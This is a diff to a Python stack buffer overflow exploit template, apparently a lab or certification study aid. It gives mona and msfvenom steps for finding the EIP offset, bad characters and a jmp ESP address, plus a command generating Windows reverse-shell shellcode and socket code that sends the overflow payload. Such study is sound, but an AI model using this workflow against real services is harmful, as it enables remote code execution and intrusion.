@@ -5,6 +5,8 @@ import socket
 # for pack
 import struct
 
+from time import *
+
 # 1. Re-create BOF with Pattern
 # !mona pc 3000
 # metasploit-framework/tools/exploit/pattern_create.rb -l 2000
@@ -12,7 +14,7 @@ import struct
 PATTERN = "13371337"
 
 # 2. Determine offset to control EIP
-# (Manually or using !mona findmsp / !mona sugest)
+# (Manually or using !mona findmsp / !mona suggest)
 # (findmsp only works in conjunction with pattern_create.rb)
 # CHANGE ME
 OFFSET = 1212
@@ -23,6 +25,9 @@ OFFSET = 1212
 TOTALSIZE = 1515
 
 # 4. Filter bad chars
+# Run immunity as admin!
+# SET WORKING DIR: `!mona config -set workingfolder c:\monalogs\%p_%i`
+##
 # Create array with all possible chars except the known one: !mona bytearray -cpb "\x00"
 # Open bytearray.txt and paste it into the exploit
 # Run !mona compare -f C:\<path to>\bytearray.bin -a <start of pattern on stack, e.g. 00AFFD44>
@@ -36,7 +41,7 @@ TOTALSIZE = 1515
 # 5. Create shellcode, e.g.
 # msfvenom -f python --var-name _shellcode_ -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 
-# 6. Add padding with NOPs before the shellcode begings (\x90) - e.g. 8 - 20 bytes
+# 6. Add padding with NOPs before the shellcode begins (\x90) - e.g. 8 - 20 bytes
 
 # 7. Determine return address
 # In case we are in control of ESP: jmp ESP needed
@@ -50,14 +55,15 @@ TOTALSIZE = 1515
 # Or quicker: !mona jmp -r esp -cpb "<Bad Chars>"
 
 # 8. Assemble payload
-# in case \0x0a in not a bad char:
-# "A" * <offset> + Return adress with reversed endianness + [Padding (NOPs) or SUB_ESP] + Shellcode
+# in case "A" (0x41) is not a bad char:
+# "A" * <offset> + Return address with reversed endianness + [Padding (NOPs) or SUB_ESP] + Shellcode
 
-# 9. EDIT THE CODE TO SEND PAYLOAD!
+# 9. EDIT THE CODE TO SEND `PAYLOAD`!
 
 # 10. Not working?
-# Try calc.exe with thread exitfunc:
-# msfvenom -p windows/exec -b '<Bad Chars>' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
+# 1. Did you re-create the payload in order to connect back to your lab IP instead of localhost?
+# 2. Try calc.exe with thread exitfunc:
+#   msfvenom -p windows/exec -b '<Bad Chars>' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
 
 # For step 8: Either create nop sled or arrange ESP
 NOP = "\x90"
@@ -71,14 +77,15 @@ EIP = struct.pack("<I", 0x78563412)
 SHELLCODE = ("\xCC\xCC\xCC\xCC")
 
 PAYLOAD = ""
-PAYLOAD += "A" * (OFFSET - TOTALSIZE)
-PAYLOAD += EIP # (Overwrite SRP)
+PAYLOAD += "A" * OFFSET
+PAYLOAD += EIP  # (Overwrite SRP)
 
 # Use one or the other
 # PAYLOAD += SUB_ESP
-PAYLOAD += NOP * 12 # For encoded payloads
+PAYLOAD += NOP * 12  # For encoded payloads
 
 PAYLOAD += SHELLCODE
+PAYLOAD += NOP * (TOTALSIZE - len(PAYLOAD))
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -90,7 +97,7 @@ try:
     data = s.recv(1024)
     print data
 
-    s.send('USER test' +'\r\n')
+    s.send('USER test' + '\r\n')
     data = s.recv(1024)
     print data
 
@@ -101,5 +108,5 @@ try:
     s.close()
     print "\nDone!"
 except Exception as e:
-	print e
-	print "Could not connect."
+    print e
+    print "Could not connect."
